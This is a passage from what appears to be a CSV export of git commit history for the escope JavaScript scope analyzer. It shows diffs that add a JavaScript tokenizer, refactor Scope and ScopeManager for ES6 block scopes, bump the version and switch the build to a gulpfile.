}<\n>+    function scanIdentifier() {<\n>+        var start<c> id<c> type;<\n>+        start = index;<\n>+        // Backslash (char #92) starts an escaped character.<\n>+        id = (source.charCodeAt(index) === 92) ? getEscapedIdentifier() : getIdentifier();<\n>+        // There is no keyword or literal with only one character.<\n>+        // Thus<c> it must be an identifier.<\n>+        if (id.length === 1) {<\n>+            type = Token.Identifier;<\n>+        } else if (isKeyword(id)) {<\n>+            type = Token.Keyword;<\n>+        } else if (id === 'null') {<\n>+            type = Token.NullLiteral;<\n>+        } else if (id === 'true' || id === 'false') {<\n>+            type = Token.BooleanLiteral;<\n>+        } else {<\n>+            type = Token.Identifier;<\n>+        }<\n>+        return {<\n>+            type: type<c><\n>+            value: id<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    // 7.7 Punctuators<\n>+    function scanPunctuator() {<\n>+        var start = index<c><\n>+            code = source.charCodeAt(index)<c><\n>+            code2<c><\n>+            ch1 = source[index]<c><\n>+            ch2<c><\n>+            ch3<c><\n>+            ch4;<\n>+        switch (code) {<\n>+        // Check for most common single-character punctuators.<\n>+        case 40:   // ( open bracket<\n>+        case 41:   // ) close bracket<\n>+        case 59:   // ; semicolon<\n>+        case 44:   // <c> comma<\n>+        case 123:  // { open curly brace<\n>+        case 125:  // } close curly brace<\n>+        case 91:   // [<\n>+        case 93:   // ]<\n>+        case 58:   // :<\n>+        case 63:   // ?<\n>+        case 126:  // ~<\n>+            ++index;<\n>+            if (extra.tokenize) {<\n>+                if (code === 40) {<\n>+                    extra.openParenToken = extra.tokens.length;<\n>+                } else if (code === 123) {<\n>+                    extra.openCurlyToken = extra.tokens.length;<\n>+                }<\n>+            }<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: String.fromCharCode(code)<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        default:<\n>+            code2 = source.charCodeAt(index + 1);<\n>+            // '=' (char #61) marks an assignment or comparison operator.<\n>+            if (code2 === 61) {<\n>+                switch (code) {<\n>+                case 37:  // %<\n>+                case 38:  // &<\n>+                case 42:  // *:<\n>+                case 43:  // +<\n>+                case 45:  // -<\n>+                case 47:  // /<\n>+                case 60:  // <<\n>+                case 62:  // ><\n>+                case 94:  // ^<\n>+                case 124: // |<\n>+                    index += 2;<\n>+                    return {<\n>+                        type: Token.Punctuator<c><\n>+                        value: String.fromCharCode(code) + String.fromCharCode(code2)<c><\n>+                        lineNumber: lineNumber<c><\n>+                        lineStart: lineStart<c><\n>+                        range: [start<c> index]<\n>+                    };<\n>+                case 33: // !<\n>+                case 61: // =<\n>+                    index += 2;<\n>+                    // !== and ===<\n>+                    if (source.charCodeAt(index) === 61) {<\n>+                        ++index;<\n>+                    }<\n>+                    return {<\n>+                        type: Token.Punctuator<c><\n>+                        value: source.slice(start<c> index)<c><\n>+                        lineNumber: lineNumber<c><\n>+                        lineStart: lineStart<c><\n>+                        range: [start<c> index]<\n>+                    };<\n>+                default:<\n>+                    break;<\n>+                }<\n>+            }<\n>+            break;<\n>+        }<\n>+        // Peek more characters.<\n>+        ch2 = source[index + 1];<\n>+        ch3 = source[index + 2];<\n>+        ch4 = source[index + 3];<\n>+        // 4-character punctuator: >>>=<\n>+        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>+            if (ch4 === '=') {<\n>+                index += 4;<\n>+                return {<\n>+                    type: Token.Punctuator<c><\n>+                    value: '>>>='<c><\n>+                    lineNumber: lineNumber<c><\n>+                    lineStart: lineStart<c><\n>+                    range: [start<c> index]<\n>+                };<\n>+            }<\n>+        }<\n>+        // 3-character punctuators: === !== >>> <<= >>=<\n>+        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '>>>'<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '<' && ch2 === '<' && ch3 === '=') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '<<='<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '>' && ch2 === '>' && ch3 === '=') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '>>='<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '.' && ch2 === '.' && ch3 === '.') {<\n>+            index += 3;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '...'<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        // Other 2-character punctuators: ++ -- << >> && ||<\n>+        if (ch1 === ch2 && ('+-<>&|'.indexOf(ch1) >= 0)) {<\n>+            index += 2;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: ch1 + ch2<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '=' && ch2 === '>') {<\n>+            index += 2;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: '=>'<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if ('<>=!+-*%&|^/'.indexOf(ch1) >= 0) {<\n>+            ++index;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: ch1<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        if (ch1 === '.') {<\n>+            ++index;<\n>+            return {<\n>+                type: Token.Punctuator<c><\n>+                value: ch1<c><\n>+                lineNumber: lineNumber<c><\n>+                lineStart: lineStart<c><\n>+                range: [start<c> index]<\n>+            };<\n>+        }<\n>+        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+    }<\n>+    // 7.8.3 Numeric Literals<\n>+    function scanHexLiteral(start) {<\n>+        var number = '';<\n>+        while (index < length) {<\n>+            if (!isHexDigit(source[index])) {<\n>+                break;<\n>+            }<\n>+            number += source[index++];<\n>+        }<\n>+        if (number.length === 0) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        if (isIdentifierStart(source.charCodeAt(index))) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.NumericLiteral<c><\n>+            value: parseInt('0x' + number<c> 16)<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanOctalLiteral(prefix<c> start) {<\n>+        var number<c> octal;<\n>+        if (isOctalDigit(prefix)) {<\n>+            octal = true;<\n>+            number = '0' + source[index++];<\n>+        } else {<\n>+            octal = false;<\n>+            ++index;<\n>+            number = '';<\n>+        }<\n>+        while (index < length) {<\n>+            if (!isOctalDigit(source[index])) {<\n>+                break;<\n>+            }<\n>+            number += source[index++];<\n>+        }<\n>+        if (!octal && number.length === 0) {<\n>+            // only 0o or 0O<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        if (isIdentifierStart(source.charCodeAt(index)) || isDecimalDigit(source.charCodeAt(index))) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.NumericLiteral<c><\n>+            value: parseInt(number<c> 8)<c><\n>+            octal: octal<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanNumericLiteral() {<\n>+        var number<c> start<c> ch<c> octal;<\n>+        ch = source[index];<\n>+        assert(isDecimalDigit(ch.charCodeAt(0)) || (ch === '.')<c><\n>+            'Numeric literal must start with a decimal digit or a decimal point');<\n>+        start = index;<\n>+        number = '';<\n>+        if (ch !== '.') {<\n>+            number = source[index++];<\n>+            ch = source[index];<\n>+            // Hex number starts with '0x'.<\n>+            // Octal number starts with '0'.<\n>+            // Octal number in ES6 starts with '0o'.<\n>+            // Binary number in ES6 starts with '0b'.<\n>+            if (number === '0') {<\n>+                if (ch === 'x' || ch === 'X') {<\n>+                    ++index;<\n>+                    return scanHexLiteral(start);<\n>+                }<\n>+                if (ch === 'b' || ch === 'B') {<\n>+                    ++index;<\n>+                    number = '';<\n>+                    while (index < length) {<\n>+                        ch = source[index];<\n>+                        if (ch !== '0' && ch !== '1') {<\n>+                            break;<\n>+                        }<\n>+                        number += source[index++];<\n>+                    }<\n>+                    if (number.length === 0) {<\n>+                        // only 0b or 0B<\n>+                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                    }<\n>+                    if (index < length) {<\n>+                        ch = source.charCodeAt(index);<\n>+                        /* istanbul ignore else */<\n>+                        if (isIdentifierStart(ch) || isDecimalDigit(ch)) {<\n>+                            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                        }<\n>+                    }<\n>+                    return {<\n>+                        type: Token.NumericLiteral<c><\n>+                        value: parseInt(number<c> 2)<c><\n>+                        lineNumber: lineNumber<c><\n>+                        lineStart: lineStart<c><\n>+                        range: [start<c> index]<\n>+                    };<\n>+                }<\n>+                if (ch === 'o' || ch === 'O' || isOctalDigit(ch)) {<\n>+                    return scanOctalLiteral(ch<c> start);<\n>+                }<\n>+                // decimal number starts with '0' such as '09' is illegal.<\n>+                if (ch && isDecimalDigit(ch.charCodeAt(0))) {<\n>+                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+                }<\n>+            }<\n>+            while (isDecimalDigit(source.charCodeAt(index))) {<\n>+                number += source[index++];<\n>+            }<\n>+            ch = source[index];<\n>+        }<\n>+        if (ch === '.') {<\n>+            number += source[index++];<\n>+            while (isDecimalDigit(source.charCodeAt(index))) {<\n>+                number += source[index++];<\n>+            }<\n>+            ch = source[index];<\n>+        }<\n>+        if (ch === 'e' || ch === 'E') {<\n>+            number += source[index++];<\n>+            ch = source[index];<\n>+            if (ch === '+' || ch === '-') {<\n>+                number += source[index++];<\n>+            }<\n>+            if (isDecimalDigit(source.charCodeAt(index))) {<\n>+                while (isDecimalDigit(source.charCodeAt(index))) {<\n>+                    number += source[index++];<\n>+                }<\n>+            } else {<\n>+                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+            }<\n>+        }<\n>+        if (isIdentifierStart(source.charCodeAt(index))) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.NumericLiteral<c><\n>+            value: parseFloat(number)<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    // 7.8.4 String Literals<\n>+    function scanStringLiteral() {<\n>+        var str = ''<c> quote<c> start<c> ch<c> code<c> unescaped<c> restore<c> octal = false;<\n>+        quote = source[index];<\n>+        assert((quote === '\'' || quote === '""')<c><\n>+            'String literal must starts with a quote');<\n>+        start = index;<\n>+        ++index;<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            if (ch === quote) {<\n>+                quote = '';<\n>+                break;<\n>+            } else if (ch === '\\') {<\n>+                ch = source[index++];<\n>+                if (!ch || !isLineTerminator(ch.charCodeAt(0))) {<\n>+                    switch (ch) {<\n>+                    case 'n':<\n>+                        str += '\n';<\n>+                        break;<\n>+                    case 'r':<\n>+                        str += '\r';<\n>+                        break;<\n>+                    case 't':<\n>+                        str += '\t';<\n>+                        break;<\n>+                    case 'u':<\n>+                    case 'x':<\n>+                        if (source[index] === '{') {<\n>+                            ++index;<\n>+                            str += scanUnicodeCodePointEscape();<\n>+                        } else {<\n>+                            restore = index;<\n>+                            unescaped = scanHexEscape(ch);<\n>+                            if (unescaped) {<\n>+                                str += unescaped;<\n>+                            } else {<\n>+                                index = restore;<\n>+                                str += ch;<\n>+                            }<\n>+                        }<\n>+                        break;<\n>+                    case 'b':<\n>+                        str += '\b';<\n>+                        break;<\n>+                    case 'f':<\n>+                        str += '\f';<\n>+                        break;<\n>+                    case 'v':<\n>+                        str += '\x0B';<\n>+                        break;<\n>+                    default:<\n>+                        if (isOctalDigit(ch)) {<\n>+                            code = '01234567'.indexOf(ch);<\n>+                            // \0 is not octal escape sequence<\n>+                            if (code !== 0) {<\n>+                                octal = true;<\n>+                            }<\n>+                            /* istanbul ignore else */<\n>+                            if (index < length && isOctalDigit(source[index])) {<\n>+                                octal = true;<\n>+                                code = code * 8 + '01234567'.indexOf(source[index++]);<\n>+                                // 3 digits are only allowed when string starts<\n>+                                // with 0<c> 1<c> 2<c> 3<\n>+                                if ('0123'.indexOf(ch) >= 0 &&<\n>+                                        index < length &&<\n>+                                        isOctalDigit(source[index])) {<\n>+                                    code = code * 8 + '01234567'.indexOf(source[index++]);<\n>+                                }<\n>+                            }<\n>+                            str += String.fromCharCode(code);<\n>+                        } else {<\n>+                            str += ch;<\n>+                        }<\n>+                        break;<\n>+                    }<\n>+                } else {<\n>+                    ++lineNumber;<\n>+                    if (ch ===  '\r' && source[index] === '\n') {<\n>+                        ++index;<\n>+                    }<\n>+                    lineStart = index;<\n>+                }<\n>+            } else if (isLineTerminator(ch.charCodeAt(0))) {<\n>+                break;<\n>+            } else {<\n>+                str += ch;<\n>+            }<\n>+        }<\n>+        if (quote !== '') {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.StringLiteral<c><\n>+            value: str<c><\n>+            octal: octal<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanTemplate() {<\n>+        var cooked = ''<c> ch<c> start<c> terminated<c> tail<c> restore<c> unescaped<c> code<c> octal;<\n>+        terminated = false;<\n>+        tail = false;<\n>+        start = index;<\n>+        ++index;<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            if (ch === '`') {<\n>+                tail = true;<\n>+                terminated = true;<\n>+                break;<\n>+            } else if (ch === '$') {<\n>+                if (source[index] === '{') {<\n>+                    ++index;<\n>+                    terminated = true;<\n>+                    break;<\n>+                }<\n>+                cooked += ch;<\n>+            } else if (ch === '\\') {<\n>+                ch = source[index++];<\n>+                if (!isLineTerminator(ch.charCodeAt(0))) {<\n>+                    switch (ch) {<\n>+                    case 'n':<\n>+                        cooked += '\n';<\n>+                        break;<\n>+                    case 'r':<\n>+                        cooked += '\r';<\n>+                        break;<\n>+                    case 't':<\n>+                        cooked += '\t';<\n>+                        break;<\n>+                    case 'u':<\n>+                    case 'x':<\n>+                        if (source[index] === '{') {<\n>+                            ++index;<\n>+                            cooked += scanUnicodeCodePointEscape();<\n>+                        } else {<\n>+                            restore = index;<\n>+                            unescaped = scanHexEscape(ch);<\n>+                            if (unescaped) {<\n>+                                cooked += unescaped;<\n>+                            } else {<\n>+                                index = restore;<\n>+                                cooked += ch;<\n>+                            }<\n>+                        }<\n>+                        break;<\n>+                    case 'b':<\n>+                        cooked += '\b';<\n>+                        break;<\n>+                    case 'f':<\n>+                        cooked += '\f';<\n>+                        break;<\n>+                    case 'v':<\n>+                        cooked += '\v';<\n>+                        break;<\n>+                    default:<\n>+                        if (isOctalDigit(ch)) {<\n>+                            code = '01234567'.indexOf(ch);<\n>+                            // \0 is not octal escape sequence<\n>+                            if (code !== 0) {<\n>+                                octal = true;<\n>+                            }<\n>+                            /* istanbul ignore else */<\n>+                            if (index < length && isOctalDigit(source[index])) {<\n>+                                octal = true;<\n>+                                code = code * 8 + '01234567'.indexOf(source[index++]);<\n>+                                // 3 digits are only allowed when string starts<\n>+                                // with 0<c> 1<c> 2<c> 3<\n>+                                if ('0123'.indexOf(ch) >= 0 &&<\n>+                                        index < length &&<\n>+                                        isOctalDigit(source[index])) {<\n>+                                    code = code * 8 + '01234567'.indexOf(source[index++]);<\n>+                                }<\n>+                            }<\n>+                            cooked += String.fromCharCode(code);<\n>+                        } else {<\n>+                            cooked += ch;<\n>+                        }<\n>+                        break;<\n>+                    }<\n>+                } else {<\n>+                    ++lineNumber;<\n>+                    if (ch ===  '\r' && source[index] === '\n') {<\n>+                        ++index;<\n>+                    }<\n>+                    lineStart = index;<\n>+                }<\n>+            } else if (isLineTerminator(ch.charCodeAt(0))) {<\n>+                ++lineNumber;<\n>+                if (ch ===  '\r' && source[index] === '\n') {<\n>+                    ++index;<\n>+                }<\n>+                lineStart = index;<\n>+                cooked += '\n';<\n>+            } else {<\n>+                cooked += ch;<\n>+            }<\n>+        }<\n>+        if (!terminated) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        return {<\n>+            type: Token.Template<c><\n>+            value: {<\n>+                cooked: cooked<c><\n>+                raw: source.slice(start + 1<c> index - ((tail) ? 1 : 2))<\n>+            }<c><\n>+            tail: tail<c><\n>+            octal: octal<c><\n>+            lineNumber: lineNumber<c><\n>+            lineStart: lineStart<c><\n>+            range: [start<c> index]<\n>+        };<\n>+    }<\n>+    function scanTemplateElement(option) {<\n>+        var startsWith<c> template;<\n>+        lookahead = null;<\n>+        skipComment();<\n>+        startsWith = (option.head) ? '`' : '}';<\n>+        if (source[index] !== startsWith) {<\n>+            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>+        }<\n>+        template = scanTemplate();<\n>+        peek();<\n>+        return template;<\n>+    }<\n>+    function scanRegExp() {<\n>+        var str<c> ch<c> start<c> pattern<c> flags<c> value<c> classMarker = false<c> restore<c> terminated = false<c> tmp;<\n>+        lookahead = null;<\n>+        skipComment();<\n>+        start = index;<\n>+        ch = source[index];<\n>+        assert(ch === '/'<c> 'Regular expression literal must start with a slash');<\n>+        str = source[index++];<\n>+        while (index < length) {<\n>+            ch = source[index++];<\n>+            str += ch;<\n>+            if (classMarker) {<\n>+                if (ch === ']') {<\n>+                    classMarker = false;<\n>+                }<\n>+            } else {<\n>+                if (ch === '\\') {<\n>+                    ch = source[index++];<\n>+                    // ECMA-262 7.8.5<\n>+                    if (isLineTerminator(ch.charCodeAt(0))) {<\n>+                        throwError({}<c> Messages.UnterminatedRegExp);<\n>+                    }<\n>+                    str += ch;<\n>+                } else if (ch === '/') {<\n>+                    terminated = true;<\n>+                    break;<\n>+                } else if (ch === '[') {<\n>+                    classMarker = true;<\n>+                } else if (isLineTerminator(ch.charCodeAt(0))) {<\n>+                    throwError({}<c> Messages.UnterminatedRegExp);<\n>+                }<\n>+            }<\n>+        }<\n>+        if (!terminated) {<\n>+            throwError({}<c> Messages.UnterminatedRegExp);<\n>+        }<\n>+        // Exclude leading and trailing slash.<\n>+        pattern = str.substr(1<c> str.length - 2);<\n>+        flags = '';<\n>+        while (index < length) {<\n>+            ch = source[index];<\n>+            if (!isIdentifierPart(ch.charCodeAt(0))) {<\n>+                break;<\n>+            }<\n>+            ++index;<\n>+            if (ch === '\\' && index < length) {<\n>+                ch = source[index];<\n>+                if (ch === 'u') {<\n>+                    ++index;<\n>+                    restore = index;<\n>+                    ch = scanHexEscape('u');<\n>+                    /* istanbul ignore else */<\n>+                    if (ch) {<\n>+                        flags += ch;<\n>+                        for (str += '\\u'; restore < index; ++restore) {<\n>+                            str += source[restore];<\n>+                        }<\n>+                    } else {<\n>+                        index = restore;<\n>+                        flags += 'u';<\n>+                        str += '\\u';<\n>+                    }<\n>+                } else {<\n>+                    str += '\\';<\n>+                }<\n>+            } else {<\n>+                flags += ch;<\n>+                str += ch;<\n>+            }<\n>+        }<\n>+        tmp = pattern;<\n>+        if (flags.indexOf('u') >= 0) {<\n>+            // Replace each astral symbol and every Unicode code point<\n>+            // escape sequence that represents such a symbol with a single<\n>+            // ASCII symbol to avoid throwing on regular expressions that<\n>+            // are only valid in combination with the `/u` flag.<\n>+            tmp = tmp<\n>+                .replace(/\\u\{([0-9a-fA-F]{5<c>6})\}/g<c> 'x')<\n>+                .replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g<c> 'x');<\n>+        }<\n>+        // First<c> detect invalid regular expressions.<\n>+        try {<\n>+            value = new RegExp(tmp);<\n>+        } catch (e) {<\n>+            throwError({}<c> Messages.InvalidRegExp);<\n>+        }<\n>+        // Return a regular expression object for this pattern-flag pair<c> or<\n>+        // `n",-        var resultScopes<c> scopeManager;<\n>-                        currentScope.variableScope.__define(decl.id<c> {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,23,17,16 Nov 2014,Add npm-debug.log to .gitignore,0,0,1,1,15,+npm-debug.log<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,23,10,16 Nov 2014,Hide internal member `Scope#left`,0,0,1,39,1868,+    function Scope(scopeManager<c> block<c> opt) {<\n>+        this.__left = [];<\n>+                new Scope(scopeManager<c> block<c> { naming: true });<\n>+            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                ref = this.__left[i];<\n>+                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                    ref = this.__left[i];<\n>+                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                    ref = this.__left[i];<\n>+            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+                ref = this.__left[i];<\n>+        this.__left = null;<\n>+            this.upper.__left.push(ref);<\n>+            this.__left.push(ref);<\n>+        return this.__left === null;<\n>+                    new Scope(scopeManager<c> node<c> {});<\n>,-    function Scope(block<c> opt) {<\n>-         /**<\n>-         * List of {@link Reference}s that are left to be resolved (i.e. which<\n>-         * need to be linked to the variable they refer to). Used internally to<\n>-         * resolve bindings during scope analysis. On a finalized scope<\n>-         * analysis<c> all sopes have <em>left</em> value <strong>null</strong>.<\n>-         * @member {Reference[]} Scope#left<\n>-         */<\n>-        this.left = [];<\n>-                new Scope(block<c> { naming: true });<\n>-            for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>-                ref = this.left[i];<\n>-                for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>-                    ref = this.left[i];<\n>-                for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>-                    ref = this.left[i];<\n>-            for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>-                ref = this.left[i];<\n>-        this.left = null;<\n>-            this.upper.left.push(ref);<\n>-            this.left.push(ref);<\n>-        return this.left === null;<\n>-                    new Scope(node<c> {});<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,23,6,16 Nov 2014,Extend __isScopeRequired,0,0,1,43,2351,+         * One of 'catch'<c> 'with'<c> 'function'<c> 'global' or 'block'.<\n>+            (block.type === Syntax.Program) ? 'global' :<\n>+            (block.type === Syntax.BlockStatement) ? 'block' : 'function';<\n>+    function ScopeManager(scopes<c> options) {<\n>+        this.__options = options;<\n>+    ScopeManager.prototype.__isES6 = function () {<\n>+        return this.__options.ecmaVersion >= 6;<\n>+    ScopeManager.prototype.__isScopeRequired = function (node<c> parent) {<\n>+        function isFunctionScopeRequired(node) {<\n>+            return node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration;<\n>+        }<\n>+        function isVariableScopeRequired(node) {<\n>+            return node.type === Syntax.Program || isFunctionScopeRequired(node);<\n>+        }<\n>+        function isScopeRequired(node) {<\n>+            return isVariableScopeRequired(node) || node.type === Syntax.WithStatement || node.type === Syntax.CatchClause;<\n>+        }<\n>+        if (this.__isES6()) {<\n>+            if (node.type === Syntax.BlockStatement) {<\n>+                // In the current AST spec<c> these are represented as BlockStatement<c> but it's FunctionBody.<\n>+                if (parent && isFunctionScopeRequired(parent)) {<\n>+                    return false;<\n>+                }<\n>+                return true;<\n>+            }<\n>+        }<\n>+        return isScopeRequired(node);<\n>+        var resultScopes<c> scopeManager;<\n>+        scopeManager = new ScopeManager(resultScopes<c> options);<\n>+            enter: function enter(node<c> parent) {<\n>+                if (scopeManager.__isScopeRequired(node<c> parent)) {<\n>+        return scopeManager;<\n>,-         * One of 'catch'<c> 'with'<c> 'function' or 'global'.<\n>-            (block.type === Syntax.Program) ? 'global' : 'function';<\n>-    function ScopeManager(scopes) {<\n>-    Scope.isScopeRequired = function isScopeRequired(node) {<\n>-        return Scope.isVariableScopeRequired(node) || node.type === Syntax.WithStatement || node.type === Syntax.CatchClause;<\n>-    Scope.isVariableScopeRequired = function isVariableScopeRequired(node) {<\n>-        return node.type === Syntax.Program || node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration;<\n>-        var resultScopes;<\n>-            enter: function enter(node) {<\n>-                if (Scope.isScopeRequired(node)) {<\n>-        return new ScopeManager(resultScopes);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,49,16 Nov 2014,update version baseline,0,0,2,4,126,"+    exports.version = '2.0.0-dev';<\n>+  ""version"": ""2.0.0-dev""<c><\n>","-    exports.version = '1.0.2-dev';<\n>-  ""version"": ""1.0.2-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,45,16 Nov 2014,Prepare for adding ecmaVersion 6,0,0,1,3,89,+            directive: false<c><\n>+            ecmaVersion: 5<\n>,-            directive: false<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,39,16 Nov 2014,Use gulpfile.coffee,1,1,1,80,3678,"+# Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+# Redistribution and use in source and binary forms<c> with or without<\n>+# modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#   * Redistributions of source code must retain the above copyright<\n>+#     notice<c> this list of conditions and the following disclaimer.<\n>+#   * Redistributions in binary form must reproduce the above copyright<\n>+#     notice<c> this list of conditions and the following disclaimer in the<\n>+#     documentation and/or other materials provided with the distribution.<\n>+#<\n>+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+# AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+# ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+# DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+# (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+# LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+# ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+# THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+gulp = require('gulp')<\n>+mocha = require('gulp-mocha')<\n>+jshint = require('gulp-jshint')<\n>+require('coffee-script/register')<\n>+TEST = [<\n>+    'test/*.coffee'<\n>+]<\n>+LINT = [<\n>+    'Gruntfile.js'<\n>+    'escope.js'<\n>+]<\n>+gulp.task 'test'<c> -><\n>+    return gulp.src(TEST)<\n>+    .pipe(mocha(<\n>+        reporter: 'spec'<\n>+    ))<\n>+gulp.task 'lint'<c> -><\n>+    return gulp.src(LINT).pipe(jshint('.jshintrc'))<\n>+gulp.task 'travis'<c> [ 'lint'<c> 'test' ]<\n>+gulp.task 'default'<c> [ 'travis' ]<\n>","-/*<\n>-  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-  Redistribution and use in source and binary forms<c> with or without<\n>-  modification<c> are permitted provided that the following conditions are met:<\n>-    * Redistributions of source code must retain the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer.<\n>-    * Redistributions in binary form must reproduce the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer in the<\n>-      documentation and/or other materials provided with the distribution.<\n>-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF 